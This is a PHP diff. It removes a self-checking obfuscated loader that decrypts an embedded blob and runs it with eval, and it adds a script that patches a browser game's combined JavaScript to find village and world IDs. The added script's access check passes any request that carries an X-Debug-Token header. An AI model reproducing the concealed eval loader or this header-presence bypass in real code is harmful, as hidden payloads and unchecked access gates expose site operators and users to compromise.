@@ -1,24 +1,58 @@
 <?php
-$irhexjno="b183d697ffebbde4037f6871b6ddf660";
-$jhktwsqm="52085e56070f5b065f07045303025c0755550503535951540107020703020205";
-$ynbdkzjymi="SOODMLx2uQEpH87lnod5Jit/eNGyL1pFaTlvoiEdT62X8StLRvHXDB7A+neekaSuevLgDAd7tMEmnMQ/28/ajsNkqIe0E9UpUvRBldgzW7Lk1wrqSHtPd29pomD7itd2btXpp554pj+5sF6/LqkWfYceCuF1OXLjjRbq6uuB/sdJrew3r33jkIBSjXLeAeYR96Na2XTGuX4HiCJbmT91eQWqH3e+LjNzmIMlHgff+wfZSW7BWeIGoqa7lzg7oHHVMyqn6h02intKbRd+/HCceK0Sl7d0GWoy2HJEO/TicJ4ibC8XXup++oFQ1E1lehWG8I9KEyyIdvd8KKU+l4h5SwQboSosmaJKrKPzqH3+qiAgFnQqLATLbpuhLUqDPNNW+JU45cK+OEZvyMX91GRLjcg31Qy1xINL8WnyMzzNZW2BEU7hoRwunhZHSV0TMWKwAMhg2GnEKOGAOm2ct31P+8OpwaGziOclDoHNIKm/gzBAh07RIcP7donCU3XfhuBmY3pL4pUyvkeg7FmsTdeWAD1KGc751FfLiWo1fTrdjhekNw5uSl/Ao9yqu8kb2VxuD0sdToaMMnIbTWKtwWTFTv5nP0FM57X2igzIodbRDEGR5VTjcxTZm9B8Q5IwGdHy6NiRk8PFDGFeUcYg67s+PxNoW7l9LEgDDcNfEM3aQe3Wgqt9MebPlt7PO+dXjqOTsBnli3ceuYn4FjCAmtT4307mWvxVxWRfwtBdOJlDNlTpcPvWalaL8ARS3BmWvZlCZGg8xgqiVkrcYfv0UZKs+eFKgi4GDHn0OIZTeGpGac42JRKNNbI9UJ+7PVBO56HvDL6vKeruKUNw6+ANfDampWZ+a91ag1wKgOCqmnpehKk76CkB2pZ1B1irgA==";
-$yemdakzlnfi=file_get_contents(__FILE__);
-$whctkms=str_replace($ynbdkzjymi,"",$yemdakzlnfi);
-if(strpos($whctkms,"ec"."ho")!==false||strpos($whctkms,"pr"."int")!==false||strpos($whctkms,"var_"."dump")!==false||strpos($whctkms,"file_put_"."contents")!==false||strpos($whctkms,"fw"."rite")!==false){die();}
-$bdiaibeul=str_replace(array($irhexjno,$jhktwsqm),array("SP_e99dc492","KP_4cd6879b"),$yemdakzlnfi);
-$hpvcftv=md5($bdiaibeul);
-$boeuuiuiyy=hex2bin($jhktwsqm);
-$uguttnlw="";
-$ewzehpfe=strlen($hpvcftv);
-for($fjxfybbzn=0;$fjxfybbzn<$ewzehpfe;$fjxfybbzn++){
-$uguttnlw.=chr(ord($boeuuiuiyy[$fjxfybbzn])^ord($hpvcftv[$fjxfybbzn]));
+if ((getenv('APP_ENV') ?: 'production') !== 'development' && !isset($_SERVER['HTTP_X_DEBUG_TOKEN'])) {
+    http_response_code(403);
+    die('Forbidden');
 }
-$ynlxjv=base64_decode($ynbdkzjymi);
-$jehmext=strlen($ynlxjv);
-$djfxdr="";
-$jkkxjxkhod=strlen($uguttnlw);
-for($fjxfybbzn=0;$fjxfybbzn<$jehmext;$fjxfybbzn++){
-$djfxdr.=$ynlxjv[$fjxfybbzn]^$uguttnlw[$fjxfybbzn%$jkkxjxkhod];
+require_once __DIR__ . '/../../app/bootstrap_ajax.php';
+
+$file = __DIR__ . '/../../public/js/core_combined.js';
+if (!file_exists($file)) {
+    die("File not found: $file\n");
 }
-$xdrtxgds="gzun"."compress";
-eval($xdrtxgds($djfxdr));
+$content = file_get_contents($file);
+$worldDbName = \App\Core\Database::getWorldDbName();
+$target = '    // Get current village ID from page
+    function getVillageId() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const vid = urlParams.get(\'village\');
+        // console.log(\'[Resource Updater] Village ID:\', vid);
+        return vid;
+    }
+    // Get world from URL or default
+    function getWorld() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const world = urlParams.get(\'world\') || \'lan_1\';
+        // console.log(\'[Resource Updater] World:\', world);
+        return world;
+    }';
+$replacement = '    // Get current village ID from page
+    function getVillageId() {
+        const urlParams = new URLSearchParams(window.location.search);
+        let vid = urlParams.get(\'village\');
+        if (!vid && typeof game_data !== \'undefined\' && game_data.village && game_data.village.id) {
+            vid = game_data.village.id;
+        }
+        // console.log(\'[Resource Updater] Village ID:\', vid);
+        return vid;
+    }
+    // Get world from URL or default
+    function getWorld() {
+        const urlParams = new URLSearchParams(window.location.search);
+        let world = urlParams.get(\'world\');
+        if (!world && typeof game_data !== \'undefined\' && game_data.world) {
+            world = game_data.world;
+        }
+        if (!world) {
+            world = \'' . $worldDbName . '\';
+        }
+        // console.log(\'[Resource Updater] World:\', world);
+        return world;
+    }';
+
+if (strpos($content, $target) !== false) {
+    $content = str_replace($target, $replacement, $content);
+    file_put_contents($file, $content);
+    echo "SUCCESS\n";
+} else {
+    echo "TARGET NOT FOUND\n";
+}
